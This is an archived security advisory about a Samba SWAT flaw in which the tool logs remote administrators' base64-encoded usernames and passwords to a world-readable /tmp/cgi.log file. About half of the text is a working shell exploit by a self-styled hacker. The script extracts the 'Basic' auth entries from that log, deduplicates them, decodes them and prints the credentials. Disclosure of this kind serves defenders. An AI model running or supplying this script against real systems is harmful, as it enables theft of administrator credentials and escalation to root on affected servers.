source: http://www.securityfocus.com/bid/1874/info

The Samba software suite is a collection of programs that implements the SMB protocol for unix systems, allowing you to serve files and printers to Windows, NT, OS/2 and DOS clients. This protocol is sometimes also referred to as the LanManager or Netbios protocol. Samba ships with a utility titled SWAT (Samba Web Administration Tool) which is used for remote administration of the Samba server and is by default set to run from inetd as root on port 701. Certain versions of this software ship with a vulnerability local users can use to leverage root access. 

This problem in particular is a permissions problem where users can take advantage of poor permission setting in SWAT's log files to read username and password data which SWAT records for all users which login to remotely administrate the server. If logging is turned on (it is not enabled by default) SWAT it logs by default to:

/tmp/cgi.log

This file is world readable and contains usernames and passwords which local users may pull from the file (base64 encoded).


#!/bin/sh
# phear my ugly shell scripting! - miah@uberhax0r.net
# grabs username:password from swat cgi.log, then decodes 
# and outputs the results.
clear
echo "######################"
echo "#checking for cgi.log#"
echo "######################"
echo
 if [ -f /tmp/cgi.log ]
  then
	echo " - cgi.log found"
	echo " - extracting logins"
	echo
	grep "Basic" /tmp/cgi.log|awk '{print $3}' > /tmp/encoded.cgi.log
	sort /tmp/encoded.cgi.log > /tmp/encoded.cgi.log.1
	uniq /tmp/encoded.cgi.log.1 > /tmp/uniq.cgi.log
	rm /tmp/encoded.cgi.log*
	for i in $( cat /tmp/uniq.cgi.log ); do
		echo $i 012| mmencode -u
		echo
	done	
	rm /tmp/uniq.cgi.log
  else
	echo " - cgi.log not found!" 
fi